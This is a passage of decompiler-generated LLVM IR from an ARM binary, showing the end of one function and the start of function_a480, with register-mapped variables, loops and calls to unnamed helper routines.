  %v1_a290 = add i32 %v2_a1f4, 16
  %v2_a290 = inttoptr i32 %v1_a290 to i32*
  %v3_a290 = load i32, i32* %v2_a290, align 4
  %v1_a294 = load i32, i32* @lr, align 4
  %v2_a294 = add i32 %v1_a294, 16
  %v3_a294 = inttoptr i32 %v2_a294 to i32*
  store i32 %v3_a290, i32* %v3_a294, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a29c = load i32, i32* @lr, align 4
  %v1_a29c = add i32 %v0_a29c, 20
  store i32 %v1_a29c, i32* %r4.global-to-local, align 4
  %v2_a2a0 = add i32 %v0_a29c, 28
  %v3_a2a0 = inttoptr i32 %v2_a2a0 to i32*
  store i32 -1, i32* %v3_a2a0, align 4
  %v0_a2a4 = load i32, i32* @r5, align 4
  %v1_a2a4 = trunc i32 %v0_a2a4 to i16
  %v2_a2a4 = load i32, i32* @lr, align 4
  %v3_a2a4 = add i32 %v2_a2a4, 4
  %v4_a2a4 = inttoptr i32 %v3_a2a4 to i16*
  store i16 %v1_a2a4, i16* %v4_a2a4, align 2
  %v0_a2a8 = load i32, i32* @lr, align 4
  %v1_a2a8 = add i32 %v0_a2a8, 32
  %v0_a2ac = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ac = trunc i32 %v0_a2ac to i16
  %v2_a2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ac = add i32 %v2_a2ac, 4
  %v4_a2ac = inttoptr i32 %v3_a2ac to i16*
  store i16 %v1_a2ac, i16* %v4_a2ac, align 2
  %v0_a2b0 = load i32, i32* @r7, align 4
  %v1_a2b0 = trunc i32 %v0_a2b0 to i16
  %v2_a2b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2b0 = add i32 %v2_a2b0, 2
  %v4_a2b0 = inttoptr i32 %v3_a2b0 to i16*
  store i16 %v1_a2b0, i16* %v4_a2b0, align 2
  %v0_a2b4 = load i32, i32* @r6, align 4
  %v1_a2b4 = trunc i32 %v0_a2b4 to i16
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 20
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i16*
  store i16 %v1_a2b4, i16* %v4_a2b4, align 2
  %v3_a2b8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2b8, i32* %r2.global-to-local, align 4
  %v3_a2bc = call i32 @function_10190(i32 %v1_a2a8, i32 %v3_a130, i32 %v3_a2b8)
  %v3_a2c0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a2c0, i32* %r3.global-to-local, align 4
  %v1_a2c4 = add i32 %v3_a2c0, 1
  store i32 %v1_a2c4, i32* @r4, align 4
  %v1_a2c8 = load i32, i32* @r8, align 4
  %v9_a2c8 = icmp eq i32 %v1_a2c4, %v1_a2c8
  store i1 %v9_a2c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a2c4, i32* %stack_var_-44, align 4
  %v5_a2d0 = icmp slt i32 %v1_a2c4, %v1_a2c8
  br i1 %v5_a2d0, label %dec_label_pc_a1d8, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %.thread, %dec_label_pc_a17c
  %v0_a2d8.ph = phi i32 [ 0, %dec_label_pc_a17c ], [ %v1_a2c8, %.thread ]
  %v3_a314 = icmp eq i32 %v3_a18c, 65535
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a3c0, %dec_label_pc_a2d4.preheader
  %v0_a2d8 = phi i32 [ %v0_a2d8.ph, %dec_label_pc_a2d4.preheader ], [ 0, %dec_label_pc_a3c0 ], [ 0, %dec_label_pc_a2d4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a2d8 = icmp eq i32 %v0_a2d8, 0
  store i1 %v2_a2d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a2d8, label %dec_label_pc_a2d4, label %dec_label_pc_a2e4

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a3c0
  br label %dec_label_pc_a2e8

dec_label_pc_a2e8:                                ; preds = %dec_label_pc_a334, %dec_label_pc_a2e4
  %v1_a2f8 = phi i32 [ %v1_a3b0, %dec_label_pc_a334 ], [ 0, %dec_label_pc_a2e4 ]
  %v5_a2ec = mul i32 %v1_a2f8, 24
  %v1_a2f0 = load i32, i32* @sl, align 4
  %v2_a2f0 = add i32 %v1_a2f0, %v5_a2ec
  store i32 %v2_a2f0, i32* %r3.global-to-local, align 4
  %v1_a2f4 = add i32 %v2_a2f0, 20
  %v2_a2f4 = inttoptr i32 %v1_a2f4 to i8*
  %v3_a2f4 = load i8, i8* %v2_a2f4, align 1
  %v4_a2f4 = zext i8 %v3_a2f4 to i32
  store i32 %v4_a2f4, i32* %r2.global-to-local, align 4
  %v0_a2f8 = load i32, i32* @fp, align 4
  %v4_a2f8 = mul i32 %v1_a2f8, 4
  %v5_a2f8 = add i32 %v0_a2f8, %v4_a2f8
  %v6_a2f8 = inttoptr i32 %v5_a2f8 to i32*
  %v7_a2f8 = load i32, i32* %v6_a2f8, align 4
  store i32 %v7_a2f8, i32* @r5, align 4
  %v7_a300 = icmp eq i8 %v3_a2f4, 31
  store i1 %v7_a300, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a308 = add i32 %v7_a2f8, 20
  store i32 %v1_a308, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a2f4, 32
  br i1 %tmp40, label %dec_label_pc_a3d4, label %dec_label_pc_a310

dec_label_pc_a310:                                ; preds = %dec_label_pc_a2e8
  store i32 %v3_a18c, i32* %r3.global-to-local, align 4
  store i1 %v3_a314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a314, label %dec_label_pc_a434, label %dec_label_pc_a31c

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a3d4, %dec_label_pc_a310
  %v1_a320 = phi i32 [ %v1_a42c, %dec_label_pc_a3d4 ], [ 65535, %dec_label_pc_a310 ]
  store i32 %v3_a190, i32* %ip.global-to-local, align 4
  %v9_a320 = icmp eq i32 %v3_a190, %v1_a320
  store i1 %v9_a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a320, label %dec_label_pc_a448, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a434.dec_label_pc_a328_crit_edge, %dec_label_pc_a31c
  %v1_a32c = phi i32 [ %v1_a32c.pre, %dec_label_pc_a434.dec_label_pc_a328_crit_edge ], [ %v1_a320, %dec_label_pc_a31c ]
  %v9_a32c = icmp eq i32 %v3_a194, %v1_a32c
  store i1 %v9_a32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a32c, label %dec_label_pc_a45c, label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a448, %dec_label_pc_a328, %dec_label_pc_a45c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a338 = load i32, i32* @r5, align 4
  %v3_a338 = add i32 %v2_a338, 10
  %v4_a338 = inttoptr i32 %v3_a338 to i16*
  store i16 0, i16* %v4_a338, align 2
  %v0_a340 = load i32, i32* @r5, align 4
  store i32 %v0_a340, i32* @r0, align 4
  %v2_a344 = call i32 @function_c848(i32 %v0_a340, i32 20)
  %v3_a344 = trunc i32 %v2_a344 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a34c = load i32, i32* @r5, align 4
  %v4_a34c = add i32 %v3_a34c, 10
  %v5_a34c = inttoptr i32 %v4_a34c to i16*
  store i16 %v3_a344, i16* %v5_a34c, align 2
  %v0_a350 = load i32, i32* %r3.global-to-local, align 4
  %v1_a350 = trunc i32 %v0_a350 to i16
  %v2_a350 = load i32, i32* @r6, align 4
  %v3_a350 = add i32 %v2_a350, 6
  %v4_a350 = inttoptr i32 %v3_a350 to i16*
  store i16 %v1_a350, i16* %v4_a350, align 2
  %v3_a354 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a354, i32* %r3.global-to-local, align 4
  %v0_a358 = load i32, i32* @r6, align 4
  store i32 %v0_a358, i32* @r1, align 4
  %v1_a35c = add i32 %v0_a358, 4
  %v2_a35c = inttoptr i32 %v1_a35c to i16*
  %v3_a35c = load i16, i16* %v2_a35c, align 2
  %v4_a35c = zext i16 %v3_a35c to i32
  store i32 %v4_a35c, i32* %r2.global-to-local, align 4
  %v1_a360 = add i32 %v3_a354, 12
  store i32 %v1_a360, i32* %r3.global-to-local, align 4
  %v0_a364 = load i32, i32* @r5, align 4
  %v4_a368 = call i32 @function_c898(i32 %v0_a364, i32 %v0_a358, i32 %v4_a35c, i32 %v1_a360)
  %v5_a368 = trunc i32 %v4_a368 to i16
  %v3_a36c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a36c, i32* %r3.global-to-local, align 4
  %v3_a370 = mul i32 %v3_a36c, 32
  store i32 %v3_a370, i32* %lr.global-to-local, align 4
  %v3_a374 = load i32, i32* @r6, align 4
  %v4_a374 = add i32 %v3_a374, 6
  %v5_a374 = inttoptr i32 %v4_a374 to i16*
  store i16 %v5_a368, i16* %v5_a374, align 2
  %v0_a378 = load i32, i32* %lr.global-to-local, align 4
  %v1_a378 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a378, -8
  %v5_a378 = add i32 %v0_a378, %tmp41
  store i32 %v5_a378, i32* %lr.global-to-local, align 4
  %v0_a37c = load i32, i32* @r6, align 4
  %v1_a37c = add i32 %v0_a37c, 2
  %v2_a37c = inttoptr i32 %v1_a37c to i16*
  %v3_a37c = load i16, i16* %v2_a37c, align 2
  %v3_a380 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a380, i32* %r2.global-to-local, align 4
  %v1_a384 = load i32, i32* @sl, align 4
  %v2_a384 = add i32 %v1_a384, %v5_a378
  store i32 %v2_a384, i32* @lr, align 4
  %v3_a388 = add i32 %v2_a384, 2
  %v4_a388 = inttoptr i32 %v3_a388 to i16*
  store i16 %v3_a37c, i16* %v4_a388, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a394 = load i32, i32* @r5, align 4
  %v0_a398 = load i32, i32* %r2.global-to-local, align 4
  %v1_a398 = add i32 %v0_a398, 32
  store i32 %v1_a398, i32* %r2.global-to-local, align 4
  %v0_a39c = load i32, i32* @sb, align 4
  %v0_a3a0 = load i32, i32* @lr, align 4
  %v6_a3a8 = call i32 @function_11338(i32 %v0_a39c, i32 %v0_a394, i32 %v1_a398, i32 16384, i32 %v0_a3a0, i32 16)
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v1_a3b0 = add i32 %v3_a3ac, 1
  %v1_a3b4 = load i32, i32* @r8, align 4
  %v9_a3b4 = icmp eq i32 %v1_a3b0, %v1_a3b4
  store i1 %v9_a3b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3b0, i32* %stack_var_-44, align 4
  %v5_a3bc = icmp slt i32 %v1_a3b0, %v1_a3b4
  br i1 %v5_a3bc, label %dec_label_pc_a2e8, label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a334
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a3c4 = icmp eq i32 %v1_a3b4, 0
  store i1 %v2_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a3c4, label %dec_label_pc_a2d4, label %dec_label_pc_a2e4

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a2e8
  %v1_a3d4 = add i32 %v2_a2f0, 16
  %v2_a3d4 = inttoptr i32 %v1_a3d4 to i32*
  %v3_a3d4 = load i32, i32* %v2_a3d4, align 4
  store i32 %v3_a3d4, i32* @r4, align 4
  %v0_a3d8 = call i32 @function_e094()
  %v3_a3dc = load i32, i32* %stack_var_-44, align 4
  %v5_a3e4 = mul i32 %v3_a3dc, 24
  %v0_a3e8 = load i32, i32* @r4, align 4
  %v1_a3e8 = and i32 %v0_a3e8, 16711680
  store i32 %v1_a3e8, i32* %ip.global-to-local, align 4
  %v3_a3ec = udiv i32 %v0_a3e8, 16777216
  %v4_a3f0 = udiv i32 %v1_a3e8, 256
  %v5_a3f0 = or i32 %v4_a3f0, %v3_a3ec
  store i32 %v5_a3f0, i32* %r2.global-to-local, align 4
  %v1_a3f4 = load i32, i32* @sl, align 4
  %v2_a3f4 = add i32 %v1_a3f4, %v5_a3e4
  %v1_a3f8 = and i32 %v0_a3e8, 65280
  store i32 %v1_a3f8, i32* %r3.global-to-local, align 4
  %v1_a3fc = add i32 %v2_a3f4, 20
  %v2_a3fc = inttoptr i32 %v1_a3fc to i8*
  %v3_a3fc = load i8, i8* %v2_a3fc, align 1
  %v4_a3fc = zext i8 %v3_a3fc to i32
  store i32 %v4_a3fc, i32* %ip.global-to-local, align 4
  %v5_a404 = call i32 @llvm.bswap.i32(i32 %v0_a3e8)
  %v7_a408 = lshr i32 %v0_a3d8, %v4_a3fc
  %v8_a408 = add i32 %v7_a408, %v5_a404
  store i32 %v8_a408, i32* %r2.global-to-local, align 4
  %v5_a420 = call i32 @llvm.bswap.i32(i32 %v8_a408)
  %v1_a424 = load i32, i32* @r5, align 4
  %v2_a424 = add i32 %v1_a424, 16
  %v3_a424 = inttoptr i32 %v2_a424 to i32*
  store i32 %v5_a420, i32* %v3_a424, align 4
  store i32 %v3_a18c, i32* %r3.global-to-local, align 4
  %v1_a42c = load i32, i32* @r7, align 4
  %v9_a42c = icmp eq i32 %v3_a18c, %v1_a42c
  store i1 %v9_a42c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a42c, label %dec_label_pc_a434, label %dec_label_pc_a31c

dec_label_pc_a434:                                ; preds = %dec_label_pc_a3d4, %dec_label_pc_a310
  %v0_a434 = call i32 @function_e094()
  %v1_a434 = trunc i32 %v0_a434 to i16
  store i32 %v3_a190, i32* %ip.global-to-local, align 4
  %v1_a43c = load i32, i32* @r7, align 4
  %v9_a43c = icmp eq i32 %v3_a190, %v1_a43c
  store i1 %v9_a43c, i1* %cpsr_z.global-to-local, align 1
  %v3_a440 = load i32, i32* @r5, align 4
  %v4_a440 = add i32 %v3_a440, 4
  %v5_a440 = inttoptr i32 %v4_a440 to i16*
  store i16 %v1_a434, i16* %v5_a440, align 2
  br i1 %v9_a43c, label %dec_label_pc_a448, label %dec_label_pc_a434.dec_label_pc_a328_crit_edge

dec_label_pc_a434.dec_label_pc_a328_crit_edge:    ; preds = %dec_label_pc_a434
  %v1_a32c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a328

dec_label_pc_a448:                                ; preds = %dec_label_pc_a434, %dec_label_pc_a31c
  %v0_a448 = call i32 @function_e094()
  %v1_a448 = trunc i32 %v0_a448 to i16
  %v1_a450 = load i32, i32* @r7, align 4
  %v9_a450 = icmp eq i32 %v3_a194, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  %v3_a454 = load i32, i32* @r5, align 4
  %v4_a454 = add i32 %v3_a454, 20
  %v5_a454 = inttoptr i32 %v4_a454 to i16*
  store i16 %v1_a448, i16* %v5_a454, align 2
  br i1 %v9_a450, label %dec_label_pc_a45c, label %dec_label_pc_a334

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448, %dec_label_pc_a328
  %v0_a45c = call i32 @function_e094()
  %v1_a45c = trunc i32 %v0_a45c to i16
  %v3_a460 = load i32, i32* @r6, align 4
  %v4_a460 = add i32 %v3_a460, 2
  %v5_a460 = inttoptr i32 %v4_a460 to i16*
  store i16 %v1_a45c, i16* %v5_a460, align 2
  br label %dec_label_pc_a334

dec_label_pc_a468:                                ; preds = %dec_label_pc_a154
  %v0_a468 = load i32, i32* @sb, align 4
  %v1_a46c = call i32 @function_10be0(i32 %v0_a468)
  br label %dec_label_pc_a470

dec_label_pc_a470:                                ; preds = %dec_label_pc_a048, %dec_label_pc_a468
  %v1_a478 = phi i32 [ %v3_a144, %dec_label_pc_a048 ], [ %v1_a46c, %dec_label_pc_a468 ]
  store i32 %v3_a048, i32* %r4.global-to-local, align 4
  store i32 %v27_a048, i32* %lr.global-to-local, align 4
  ret i32 %v1_a478

; uselistorder directives
  uselistorder i32 %v1_a42c, { 1, 0 }
  uselistorder i32 %v0_a3e8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a3b0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a378, { 1, 0 }
  uselistorder i1 %v3_a314, { 1, 0 }
  uselistorder i32 %v1_a2c4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a22c, { 1, 0 }
  uselistorder i32 %v3_a1c4, { 1, 0 }
  uselistorder i32 %v3_a1c0, { 1, 0 }
  uselistorder i32 %v0_a184, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a180, { 1, 0, 2 }
  uselistorder i32 %v0_a17c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a174, { 1, 0 }
  uselistorder i1 %v7_a148, { 1, 0 }
  uselistorder i32 %v3_a144, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a0e4, { 1, 0 }
  uselistorder i32 %v5_a0b8, { 1, 0 }
  uselistorder i32 %v5_a07c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a470, { 1, 0 }
  uselistorder label %dec_label_pc_a334, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e4, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_a480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a480:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a480 = load i32, i32* @sb, align 4
  %v27_a480 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4a0 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_a4a4 = load i32, i32* @r5, align 4
  store i32 %v0_a4a4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4b0 = load i32, i32* @r4, align 4
  store i32 %v0_a4b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4b8 = inttoptr i32 %v0_a4a4 to i32*
  %v6_a4b8 = call i32 @function_8570(i32 %v0_a4b0, i32* %v5_a4b8, i32 2, i32 0)
  %v1_a4c4 = urem i32 %v6_a4b8, 256
  store i32 %v1_a4c4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a4d0 = load i32, i32* @r4, align 4
  store i32 %v0_a4d0, i32* %r0.global-to-local, align 4
  %v0_a4d4 = load i32, i32* @r5, align 4
  store i32 %v0_a4d4, i32* %r1.global-to-local, align 4
  %v6_a4dc = inttoptr i32 %v0_a4d4 to i32*
  %v7_a4dc = call i32 @function_8570(i32 %v0_a4d0, i32* %v6_a4dc, i32 3, i32 65535)
  %v0_a4e0 = load i32, i32* @r5, align 4
  store i32 %v0_a4e0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a4ec = load i32, i32* @r4, align 4
  store i32 %v0_a4ec, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a4f4 = inttoptr i32 %v0_a4e0 to i32*
  %v6_a4f4 = call i32 @function_8570(i32 %v0_a4ec, i32* %v5_a4f4, i32 4, i32 64)
  %v1_a4fc = urem i32 %v6_a4f4, 256
  store i32 %v1_a4fc, i32* %ip.global-to-local, align 4
  %v0_a500 = load i32, i32* @r5, align 4
  store i32 %v0_a500, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a50c = load i32, i32* @r4, align 4
  store i32 %v0_a50c, i32* %r0.global-to-local, align 4
  %v6_a514 = inttoptr i32 %v0_a500 to i32*
  %v7_a514 = call i32 @function_8570(i32 %v0_a50c, i32* %v6_a514, i32 5, i32 0)
  %v1_a520 = urem i32 %v7_a514, 256
  store i32 %v1_a520, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  %v0_a530 = load i32, i32* @r5, align 4
  store i32 %v0_a530, i32* %r1.global-to-local, align 4
  %v5_a538 = inttoptr i32 %v0_a530 to i32*
  %v6_a538 = call i32 @function_8570(i32 %v0_a52c, i32* %v5_a538, i32 6, i32 65535)
  %v0_a53c = load i32, i32* @r5, align 4
  store i32 %v0_a53c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a548 = load i32, i32* @r4, align 4
  store i32 %v0_a548, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a550 = inttoptr i32 %v0_a53c to i32*
  %v6_a550 = call i32 @function_8570(i32 %v0_a548, i32* %v5_a550, i32 7, i32 53)
  %v0_a55c = load i32, i32* @r5, align 4
  store i32 %v0_a55c, i32* %r1.global-to-local, align 4
  %v0_a560 = load i32, i32* @r4, align 4
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a56c = inttoptr i32 %v0_a55c to i32*
  %v6_a56c = call i32 @function_8570(i32 %v0_a560, i32* %v5_a56c, i32 9, i32 65535)
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a57c = load i32, i32* @r4, align 4
  store i32 %v0_a57c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a584 = inttoptr i32 %v0_a570 to i32*
  %v6_a584 = call i32 @function_8570(i32 %v0_a57c, i32* %v5_a584, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a590 = load i32, i32* @r5, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  store i32 %v6_a584, i32* %sb.global-to-local, align 4
  %v0_a598 = load i32, i32* @r4, align 4
  store i32 %v0_a598, i32* %r0.global-to-local, align 4
  %v4_a59c = inttoptr i32 %v0_a590 to i32*
  %v5_a59c = call i32 @function_8190(i32 %v0_a598, i32* %v4_a59c, i32 8, i32 0)
  store i32 %v5_a59c, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5a8 = call i32 @function_fd40(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5b4 = call i32 @function_fc7c(i32 21, i32* null)
  store i32 %v3_a5b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5bc = call i32 @function_107ec(i32 %v3_a5b4, i32 0)
  store i32 %v2_a5bc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5c8 = call i32 @function_fca0(i32 21)
  store i32 %v1_a5c8, i32* %r0.global-to-local, align 4
  %v0_a5cc = load i32, i32* @r4, align 4
  %v1_a5cc = icmp slt i32 %v0_a5cc, 0
  %v2_a5cc = icmp eq i32 %v0_a5cc, 0
  store i1 %v2_a5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a5cc, label %dec_label_pc_aac4, label %dec_label_pc_a5d4

dec_label_pc_a5d4:                                ; preds = %dec_label_pc_a480
  %v2_a5d8 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a5d8, i32* @sl, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_a5d8, i32* %r1.global-to-local, align 4
  store i32 %v0_a5cc, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @function_10978(i32 %v0_a5cc)
  store i32 %v1_a5e8, i32* @r5, align 4
  %v0_a5f0 = load i32, i32* @r4, align 4
  store i32 %v0_a5f0, i32* %r0.global-to-local, align 4
  %v1_a5f4 = call i32 @function_10be0(i32 %v0_a5f0)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a5fc = call i32 @function_fd40(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a608 = call i32 @function_fc7c(i32 22, i32* null)
  %v0_a60c = load i32, i32* @r5, align 4
  store i32 %v0_a60c, i32* @r1, align 4
  store i32 %v3_a608, i32* %r2.global-to-local, align 4
  store i32 %v2_a5d8, i32* %r0.global-to-local, align 4
  %v3_a618 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a618 = call i32 @function_10470(i8* %v3_a618, i32 %v0_a60c, i32 %v3_a608)
  store i32 %v4_a618, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a624 = call i32 @function_fca0(i32 22)
  store i32 %v1_a624, i32* %r0.global-to-local, align 4
  %v0_a628 = load i32, i32* @r6, align 4
  %v7_a628 = icmp eq i32 %v0_a628, -1
  store i1 %v7_a628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a628, label %dec_label_pc_aac4, label %dec_label_pc_a630

dec_label_pc_a630:                                ; preds = %dec_label_pc_a5d4
  %v0_a630 = load i32, i32* @r5, align 4
  %v9_a630 = icmp eq i32 %v0_a630, %v0_a628
  store i1 %v9_a630, i1* %cpsr_z.global-to-local, align 1
  %v7_a634 = icmp sgt i32 %v0_a630, %v0_a628
  br i1 %v7_a634, label %dec_label_pc_a638, label %dec_label_pc_aac4

dec_label_pc_a638:                                ; preds = %dec_label_pc_a630
  %v0_a638 = load i32, i32* @sl, align 4
  %v2_a638 = add i32 %v0_a638, %v0_a628
  store i32 %v2_a638, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a664 = add i32 %v0_a630, -1
  br label %dec_label_pc_a65c

dec_label_pc_a648:                                ; preds = %dec_label_pc_a684, %bb103
  %v9_a648 = icmp eq i32 %v1_a664, %v0_a650
  store i1 %v9_a648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a648, label %dec_label_pc_a690, label %dec_label_pc_a650

dec_label_pc_a650:                                ; preds = %dec_label_pc_a674, %dec_label_pc_a648, %bb
  %v0_a68029 = phi i32 [ %v0_a680, %dec_label_pc_a674 ], [ %v0_a68030, %dec_label_pc_a648 ], [ %v0_a680, %bb ]
  %v0_a66025 = phi i32 [ 0, %dec_label_pc_a674 ], [ %v0_a66026, %dec_label_pc_a648 ], [ 0, %bb ]
  %v1_a650 = add i32 %v0_a650, 1
  %v9_a654 = icmp eq i32 %v1_a650, %v0_a630
  store i1 %v9_a654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a654, label %dec_label_pc_aac4, label %dec_label_pc_a65c

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a650, %dec_label_pc_a638
  %v0_a650 = phi i32 [ %v1_a650, %dec_label_pc_a650 ], [ %v0_a628, %dec_label_pc_a638 ]
  %v0_a680 = phi i32 [ %v0_a68029, %dec_label_pc_a650 ], [ 0, %dec_label_pc_a638 ]
  %v0_a660 = phi i32 [ %v0_a66025, %dec_label_pc_a650 ], [ 0, %dec_label_pc_a638 ]
  %v0_a668 = phi i32 [ %v1_a668, %dec_label_pc_a650 ], [ %v2_a638, %dec_label_pc_a638 ]
  %v1_a65c = inttoptr i32 %v0_a668 to i8*
  %v2_a65c = load i8, i8* %v1_a65c, align 1
  %v3_a65c = zext i8 %v2_a65c to i32
  store i32 %v3_a65c, i32* %r3.global-to-local, align 4
  %v2_a660 = icmp eq i32 %v0_a660, 0
  store i1 %v2_a660, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v1_a668 = add i32 %v0_a668, 1
  store i32 %v1_a668, i32* %r2.global-to-local, align 4
  %v1_a66c = add nsw i32 %v3_a65c, -48
